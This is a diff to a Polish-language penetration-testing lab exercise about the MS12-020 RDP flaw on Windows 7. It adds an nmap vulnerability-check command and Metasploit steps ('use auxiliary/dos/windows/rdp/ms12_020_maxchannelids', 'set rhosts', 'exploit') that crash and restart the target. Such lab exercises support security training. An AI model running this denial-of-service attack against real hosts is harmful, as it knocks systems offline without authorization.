@@ -277,11 +277,15 @@ TCP celu, jeśli cel odpowie na próbę nawiązania połączenia, to oznacza że
 ================================================
 
 3.  Sprawdź podatność Windows 7 na błąd MS12-020 (ms12_020_check). Następnie, jeżeli jest podatny, wykorzystaj tę lukę (ms12_020_maxchannelids), aby przeprowadzić atak DoS.
+nmap -sV --script=rdp-vuln-ms12-020 -p 3389 ip_win7
 
-use auxiliary/scanner/rdp/ms12-020_check
+Następnie, jeżeli jest podatny, wykorzystaj tę podatność (ms12_020_maxchannelids), aby przeprowadzić atak DoS.
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
 set rhosts ip_maszyny
 exploit 
 back 
+
+Efektem jest restart celu.
 
 Zapoznaj się z opisem i sposobem działania podatności:
  
